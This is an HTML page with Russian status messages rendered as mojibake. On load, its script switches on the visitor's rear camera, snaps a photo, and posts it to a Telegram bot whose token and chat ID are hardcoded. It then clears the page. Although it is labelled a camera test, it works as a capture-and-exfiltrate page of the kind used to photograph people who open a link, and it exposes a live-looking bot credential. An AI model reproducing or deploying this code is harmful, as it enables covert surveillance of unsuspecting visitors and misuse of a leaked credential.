<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; }
        #status { 
            position: fixed; top:20px; left:0; width:100%; 
            color:#0f0; font-family:Arial; text-align:center; 
            font-size:14px; z-index:1000; 
        }
        #testImage { 
            position: fixed; top:50%; left:50%; transform:translate(-50%,-50%);
            max-width:90%; max-height:70%; border:2px solid #0f0; display:none;
        }
    </style>
</head>
<body>
    <div id="status">üîç –¢–µ—Å—Ç –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã...</div>
    <img id="testImage" alt="–¢–µ—Å—Ç–æ–≤–æ–µ —Ñ–æ—Ç–æ">

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const status = document.getElementById('status');
const testImage = document.getElementById('testImage');

async function testBackCamera() {
    let stream = null;
    
    try {
        status.textContent = '1. –í–∫–ª—é—á–∞—é –ó–ê–î–ù–Æ–Æ –∫–∞–º–µ—Ä—É...';
        
        // === –ó–ê–î–ù–Ø–Ø –ö–ê–ú–ï–†–ê ===
        stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'environment', // –ó–ê–î–ù–Ø–Ø –∫–∞–º–µ—Ä–∞
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            }
        });
        
        status.textContent = '‚úÖ –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –≤–∫–ª—é—á–µ–Ω–∞';
        
        const video = document.createElement('video');
        video.srcObject = stream;
        
        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                status.textContent = '2. –ù–∞—Å—Ç—Ä–∞–∏–≤–∞—é (2 —Å–µ–∫)...';
                resolve();
            };
        });
        
        // –ñ–¥–µ–º 2 —Å–µ–∫—É–Ω–¥—ã
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // –î–µ–ª–∞–µ–º —Ç–µ—Å—Ç–æ–≤—ã–π —Å–Ω–∏–º–æ–∫ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –Ω–∞ —ç–∫—Ä–∞–Ω–µ
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
        stream.getTracks().forEach(track => track.stop());
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ñ–æ—Ç–æ –ù–ê –≠–ö–†–ê–ù–ï –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏
        const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
        testImage.src = dataUrl;
        testImage.style.display = 'block';
        
        status.textContent = 'üì∏ –¢–µ—Å—Ç–æ–≤–æ–µ —Ñ–æ—Ç–æ –Ω–∞ —ç–∫—Ä–∞–Ω–µ. –ö–∞–∫–æ–µ –æ–Ω–æ?';
        
        // –ñ–¥–µ–º 5 —Å–µ–∫—É–Ω–¥, –∑–∞—Ç–µ–º –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
        setTimeout(async () => {
            status.textContent = '3. –û—Ç–ø—Ä–∞–≤–ª—è—é –≤ Telegram...';
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'back_camera_test.jpg');
                formData.append('caption', 'üì∑ –¢–µ—Å—Ç –ó–ê–î–ù–ï–ô –∫–∞–º–µ—Ä—ã');
                
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    if (result.ok) {
                        status.textContent = '‚úÖ –¢–µ—Å—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –°—Ç—Ä–∞–Ω–∏—Ü–∞ –æ—á–∏—Å—Ç–∏—Ç—Å—è —á–µ—Ä–µ–∑ 5 —Å–µ–∫.';
                        status.style.color = '#0f0';
                        setTimeout(() => {
                            document.body.innerHTML = '';
                        }, 5000);
                    } else {
                        status.textContent = `‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ${result.description}`;
                        status.style.color = '#f00';
                    }
                } catch (error) {
                    status.textContent = '‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ';
                    status.style.color = '#f00';
                }
            }, 'image/jpeg', 0.9);
            
        }, 5000); // –ñ–¥–µ–º 5 —Å–µ–∫—É–Ω–¥ –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π
        
    } catch (error) {
        status.textContent = `‚ùå –û—à–∏–±–∫–∞: ${error.message}`;
        status.style.color = '#f00';
        if (stream) stream.getTracks().forEach(track => track.stop());
    }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–µ—Å—Ç
testBackCamera();
</script>
</body>
</html>
